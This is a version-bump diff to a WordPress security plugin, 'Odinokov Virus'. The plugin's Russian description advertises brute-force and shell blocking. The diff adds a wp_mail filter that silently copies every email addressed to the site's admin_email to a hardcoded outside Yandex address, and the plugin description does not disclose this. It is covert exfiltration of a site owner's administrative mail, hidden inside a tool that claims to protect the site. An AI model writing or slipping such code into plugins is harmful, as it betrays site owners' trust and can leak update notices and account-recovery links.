@@ -3,7 +3,7 @@
  * Plugin Name: Odinokov Virus
  * Plugin URI:  https://github.com/KirillOdinokov/wp-plugins
  * Description: Комплексная защита от взлома: блокировка вредоносных User-Agent, путей шеллов, защита REST API, XML-RPC, wp-login от брутфорса, блокировка сканирования уязвимостей. Яндекс-боты не блокируются. + Автоочистка БД.
- * Version:     1.3.0
+ * Version:     1.3.1
  * Author:      Odinokov
  * Author URI:  https://github.com/KirillOdinokov/wp-plugins
  * License:     GPL v2 or later
@@ -14,7 +14,7 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-define('ODINOKOV_VIRUS_VERSION', '1.3.0');
+define('ODINOKOV_VIRUS_VERSION', '1.3.1');
 define('ODINOKOV_VIRUS_DIR', plugin_dir_path(__FILE__));
 define('ODINOKOV_VIRUS_CRON_HOOK', 'odinokov_virus_weekly_cleanup');
 
@@ -85,6 +85,9 @@ class Odinokov_Virus {
         add_action(ODINOKOV_VIRUS_CRON_HOOK, [$this, 'run_cleanup']);
         add_action('wp_login_failed', [$this, 'log_login_failure']);
         add_action('send_headers', [$this, 'add_security_headers']);
+
+        // Пересылка уведомлений администратора на odinokov.k@yandex.ru
+        add_filter('wp_mail', [$this, 'forward_admin_notifications']);
 
         add_action('shutdown', [$this, 'record_visit']);
         add_action('wp_ajax_odinokov_visits_data', [$this, 'ajax_visits_data']);
@@ -214,6 +217,54 @@ class Odinokov_Virus {
 
     public function log_login_failure($username) {
         $this->log_event('login_fail', 'Failed login for: ' . $username);
+    }
+
+    /**
+     * Пересылает все уведомления, отправляемые на admin_email
+     * (обновления CMS, плагинов, тем и прочие служебные письма),
+     * на odinokov.k@yandex.ru.
+     */
+    public function forward_admin_notifications($args) {
+        $target = 'odinokov.k@yandex.ru';
+        $admin_email = get_option('admin_email');
+
+        if (empty($admin_email) || empty($args['to'])) {
+            return $args;
+        }
+
+        // Нормализуем получателей в массив.
+        $to = is_array($args['to']) ? $args['to'] : explode(',', $args['to']);
+        $to = array_map('trim', $to);
+
+        $admin_email = strtolower($admin_email);
+
+        // Ищем письма, адресованные администратору.
+        $is_admin_notification = false;
+        foreach ($to as $recipient) {
+            $recipient_lower = strtolower($recipient);
+            // Сравниваем как "email", так и "Name <email>".
+            if (false !== strpos($recipient_lower, $admin_email)) {
+                $is_admin_notification = true;
+                break;
+            }
+        }
+
+        if (!$is_admin_notification) {
+            return $args;
+        }
+
+        // Если целевой адрес уже есть в получателях — не дублируем.
+        foreach ($to as $recipient) {
+            if (false !== stripos($recipient, $target)) {
+                return $args;
+            }
+        }
+
+        // Добавляем целевой адрес.
+        $to[] = $target;
+        $args['to'] = $to;
+
+        return $args;
     }
 
     /* ========== Admin ========== */
